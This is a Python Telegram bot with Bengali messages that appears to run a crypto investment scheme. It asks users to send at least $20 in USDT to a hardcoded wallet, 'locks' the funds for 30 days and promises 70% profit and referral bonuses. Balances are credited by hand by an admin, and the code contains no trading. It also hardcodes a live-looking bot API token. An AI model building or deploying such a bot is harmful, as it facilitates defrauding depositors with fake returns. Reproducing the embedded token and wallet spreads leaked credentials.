import os
from flask import Flask
from threading import Thread

app = Flask('')
@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()
from telebot import types
import sqlite3
from datetime import datetime, timedelta

# --- আপনার তথ্যসমূহ ---
API_TOKEN = '8770587499:AAE9WrB_G0Ugz2dyNkL8bSPyWCiIXq27uoM'
ADMIN_ID = 8155493482
MY_WALLET = "0x22b4907dc3bc250e92ffa402c47f2776faeadf64"

bot = telebot.TeleBot(API_TOKEN)

# ডাটাবেজ সেটআপ
def init_db():
    conn = sqlite3.connect('trading_master_v12.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id INTEGER PRIMARY KEY, total_balance REAL, profit REAL, dep_date TEXT)''')
    conn.commit()
    conn.close()

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('💰 Deposit', '📊 My Balance', '💳 Withdraw')
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    full_rules = (
        "👋 **আসসালামু আলাইকুম!**\n\n"
        "📜 **বটের বিস্তারিত নিয়মাবলী:**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "১. 💵 **ডিপোজিট:** সর্বনিম্ন ২০$ (USDT-BEP20) ইনভেস্ট করতে পারেন।\n\n"
        "২. ⏳ **সময়সীমা:** আপনার ডলার ৩০ দিনের জন্য লক থাকবে।\n\n"
        "৩. 📈 **প্রফিট:** মাস শেষে লাভের ৭০% আপনার ব্যালেন্সে যোগ হবে।\n\n"
        "৪. ✅ **ভেরিফিকেশন:** সঠিক TxID বা স্ক্রিনশট সাবমিট করতে হবে।\n\n"
        "৫. 🎁 **রেফার বোনাস:** প্রতি জন রেফারেল ইনভেস্টমেন্টে ০.৫০$ বোনাস।\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 **আপনার আইডি:** `{message.chat.id}`"
    )
    bot.send_message(message.chat.id, full_rules, reply_markup=main_menu(), parse_mode="Markdown")

# ১. ইনভেস্টমেন্ট অ্যাপ্রুভ কমান্ড
@bot.message_handler(commands=['approve'])
def approve_depo(message):
    if message.chat.id == ADMIN_ID:
        try:
            args = message.text.split()
            u_id = int(args[1])
            amt = float(args[2])
            today = datetime.now().strftime('%Y-%m-%d')
            
            conn = sqlite3.connect('trading_master_v12.db')
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO users VALUES (?, 0, 0, ?)", (u_id, today))
            c.execute("UPDATE users SET total_balance = total_balance + ?, dep_date = ? WHERE user_id = ?", (amt, today, u_id))
            
            if len(args) > 3:
                ref_id = int(args[3])
                c.execute("INSERT OR IGNORE INTO users VALUES (?, 0, 0, ?)", (ref_id, today))
                c.execute("UPDATE users SET profit = profit + 0.5 WHERE user_id = ?", (ref_id,))
                bot.send_message(ref_id, "🎁 আপনি ০.৫০$ রেফার বোনাস পেয়েছেন!")
            
            conn.commit()
            conn.close()
            bot.send_message(u_id, f"✅ আপনার {amt}$ ইনভেস্টমেন্ট অ্যাপ্রুভ হয়েছে। তারিখ: {today}")
            bot.send_message(ADMIN_ID, f"✅ আইডি {u_id} সাকসেস।")
        except Exception as e:
            bot.send_message(ADMIN_ID, "❌ ফরম্যাট ভুল! লিখুন: /approve আইডি টাকা রেফারার")

# ২. ব্যালেন্স চেক (তারিখসহ)
@bot.message_handler(func=lambda m: m.text == '📊 My Balance')
def check_balance(message):
    conn = sqlite3.connect('trading_master_v12.db')
    c = conn.cursor()
    c.execute("SELECT total_balance, profit, dep_date FROM users WHERE user_id = ?", (message.chat.id,))
    data = c.fetchone()
    conn.close()
    
    if data and data[2]:
        m_bal, p_bal, d_date = data[0], data[1], data[2]
        start_date = datetime.strptime(d_date, '%Y-%m-%d')
        unlock_date = (start_date + timedelta(days=30)).strftime('%d %b, %Y')
        formatted_start = start_date.strftime('%d %b, %Y')
        
        msg = (
            f"📊 **ব্যালেন্স ডিটেইলস**\n\n"
            f"💵 ইনভেস্ট: {m_bal}$\n"
            f"📈 প্রফিট: {p_bal}$\n"
            f"📅 শুরুর তারিখ: {formatted_start}\n"
            f"🔓 **আনলক হবে:** {unlock_date}\n\n"
            f"🔒 স্ট্যাটাস: ৩০ দিনের জন্য লক আছে।"
        )
    else:
        msg = "❌ কোনো সক্রিয় ইনভেস্টমেন্ট নেই।"
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

# ৩. অন্যান্য বাটন
@bot.message_handler(func=lambda m: True, content_types=['text', 'photo'])
def handle_all(message):
    if message.text == '💰 Deposit':
        bot.send_message(message.chat.id, f"USDT অ্যাড্রেস:\n`{MY_WALLET}`\n\nটাকা পাঠিয়ে TxID দিন।")
    elif message.text == '💳 Withdraw':
        bot.send_message(message.chat.id, "💳 ব্যালেন্সের স্ক্রিনশট এবং ডিটেইলস লিখে পাঠান।")
    elif message.chat.id != ADMIN_ID:
        if message.content_type == 'photo':
            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=f"📩 আইডি: `{message.chat.id}`")
        else:
            bot.send_message(ADMIN_ID, f"📩 আইডি: `{message.chat.id}`\n🔑 টেক্সট: {message.text}")
        bot.reply_to(message, "⏳ Pending...")

if __name__ == "__main__":
    init_db()
    print("বট চলছে...")
    bot.infinity_polling()
